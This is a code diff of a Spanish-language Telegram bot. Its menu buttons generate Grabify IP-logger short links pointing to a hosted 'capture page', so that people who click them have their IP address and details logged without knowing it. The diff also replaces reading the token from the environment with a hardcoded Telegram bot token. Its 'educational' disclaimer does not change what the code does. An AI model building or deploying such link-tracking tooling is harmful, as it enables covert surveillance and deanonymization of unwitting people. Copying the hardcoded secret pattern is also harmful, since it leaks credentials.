@@ -5,18 +5,13 @@ const fetch = require('node-fetch');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// El token se lee desde la variable de entorno BOT_TOKEN
-const BOT_TOKEN = process.env.BOT_TOKEN;
-if (!BOT_TOKEN) {
-  console.error("Falta la variable de entorno BOT_TOKEN");
-  process.exit(1);
-}
+// ⚠️ PON AQUÍ TU NUEVO TOKEN (el que acabas de crear con @BotFather)
+const BOT_TOKEN = '8803149571:AAHDOGrQ-Y0TSoZBP4mSLzQlHTOFAbgR0Ug'; // <--- Cámbialo por tu token
+
 const bot = new Telegraf(BOT_TOKEN);
 
-// ⚠️ CAMBIA ESTA URL POR LA DE TU PÁGINA DE RENDER (la que funciona)
-const BASE_URL = 'https://societyy.onrender.com';
+const BASE_URL = 'https://societyy.onrender.com'; // Tu página de captura
 
-// Función para crear enlace acortado con Grabify
 async function createGrabifyLink(url) {
   const res = await fetch('https://grabify.link/api/create', {
     method: 'POST',
@@ -27,7 +22,6 @@ async function createGrabifyLink(url) {
   return data.url;
 }
 
-// Comando /menu
 bot.command('menu', async (ctx) => {
   const keyboard = {
     inline_keyboard: [
@@ -41,7 +35,6 @@ bot.command('menu', async (ctx) => {
   await ctx.reply('🎯 Selecciona una opción:', { reply_markup: keyboard });
 });
 
-// Acción para cada botón
 bot.action('monitoreo', async (ctx) => {
   await ctx.answerCbQuery();
   const link = await createGrabifyLink(BASE_URL);
@@ -67,18 +60,13 @@ bot.action('info', async (ctx) => {
   await ctx.reply('ℹ️ Bot educativo. No compartas enlaces sin consentimiento.');
 });
 
-// Comando /start
 bot.start(async (ctx) => {
   await ctx.reply('¡Hola! Usa /menu para ver las opciones.');
 });
 
-// Servidor web para mantener el bot activo (obligatorio en Render)
 app.get('/', (req, res) => res.send('Bot activo'));
 app.listen(PORT, () => console.log(`Bot iniciado en puerto ${PORT}`));
 
-// Lanzar el bot
 bot.launch();
-
-// Manejar cierre limpio
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
